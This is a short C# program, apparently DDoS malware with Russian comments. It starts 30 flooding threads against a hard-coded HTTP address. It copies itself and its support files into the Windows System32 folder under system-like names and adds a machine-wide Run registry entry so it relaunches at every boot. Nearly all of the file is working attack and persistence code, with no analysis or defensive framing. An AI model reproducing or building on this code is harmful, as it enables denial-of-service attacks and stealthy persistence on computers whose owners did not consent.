using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;

namespace md.sys
{
    class Program
    {
        private static bool IsDebug = false;
        private static uint CountThreadDDoS = 30;
        private static bool IsDDoS = true;


        private static ThreadDDoS[] ThreadDDoSs = new ThreadDDoS[CountThreadDDoS];

        static void Main(string[] args)
        {
            Console.WriteLine("start....");
            Init();

            ThreadDDoS.isClearMemory = false;

            for (int i = 0; i < CountThreadDDoS && IsDDoS; i++)
            {
                ThreadDDoSs[i] = new ThreadDDoS("http://192.168.0.1/t", timeOut: 10);
            }

          
            Console.WriteLine("\n\n\tPress any key to enter...");
            Console.ReadKey();
        }


        private static void Init()
        {
            string addressExeFileInSys32 = null;
            string sys32 = Environment.GetFolderPath(Environment.SpecialFolder.System);
            // перемещение в системный каталог
            try
            {
                
                string fileName = Process.GetCurrentProcess().ProcessName + ".exe";
                string thisDirectory = Directory.GetCurrentDirectory();
                // extra Files
                string[] extraFiles = { 
                    "md.sys.dll", 
                    "md.sys.runtimeconfig.json",
                    "md.init.exe",
                    "md.init.dll",
                    "md.init.runtimeconfig.json"
                };

                File.Copy(thisDirectory + "\\" + fileName, sys32 + "\\" + fileName, true); // copy exe file
                // copy extra files
                foreach(string i in extraFiles)
                {
                    File.Copy(thisDirectory + "\\" + i, sys32 + "\\" + i, true);
                }

                addressExeFileInSys32 = sys32 + "\\" + fileName;
                
            }
            catch (Exception ex)
            {
                if (ex.GetBaseException().GetType() == typeof(IOException))
                {
                    Console.WriteLine("\nError!\tНельзя переписать текущий файл!");
                }
                else if (ex.GetBaseException().GetType() == typeof(UnauthorizedAccessException))
                {
                    Console.WriteLine("\nError!\tНедостаточно прав!");
                }
                else
                    Console.WriteLine(ex);
            }


            // авто загрузка
            if (addressExeFileInSys32 == null)
            {
                Console.WriteLine("\nError!\tFile or Directory invalid");
                return;
            }

            if (!IsDebug) {
                RegistryKey Key =
                                Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);

                // добавляем первый параметр - название ключа  
                // Второй параметр - это путь к   
                // исполняемому файлу нашей программы.  
                Key.SetValue("md.sys", sys32 + "\\md.init.exe");
                Key.Close();
            }

        }
    }
}
